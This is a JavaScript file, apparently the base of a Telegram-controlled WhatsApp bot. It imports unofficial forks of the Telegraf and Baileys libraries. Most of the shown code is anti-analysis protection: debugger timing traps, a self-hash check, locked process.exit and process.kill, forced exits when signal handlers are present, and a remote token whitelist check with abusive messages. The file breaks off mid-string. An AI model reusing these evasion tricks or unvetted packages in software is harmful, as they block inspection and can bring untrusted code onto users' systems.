//Base Rich By @gaponback
import { Telegraf, RichMessage, Markup, 
session } from '@icanseeuanywhere/telekaf'
import fs from "fs";
import path from "path";
import moment from "moment-timezone";
import {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} from "@bellachu/baileys";
import pino from "pino";
import chalk from "chalk";
import axios from "axios";
import readline from "readline";
import config from "./config.js";
const { BOT_TOKEN, OWNER_IDS } = config;
import crypto from "crypto";
const sessionPath = './session';
let bots = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./Database/prem.json";
const adminFile = "./Database/edmin.json";
let secureMode = false;

const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};


const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const randomImages = [
"https://files.catbox.moe/dfo13q.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const databaseUrl = "https://raw.githubusercontent.com/databasekaze/databasekaze/refs/heads/main/tokens.json";

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

global.validateToken = async (databaseUrl, BOT_TOKEN) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(BOT_TOKEN)) {
      console.log(chalk.bold.red(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
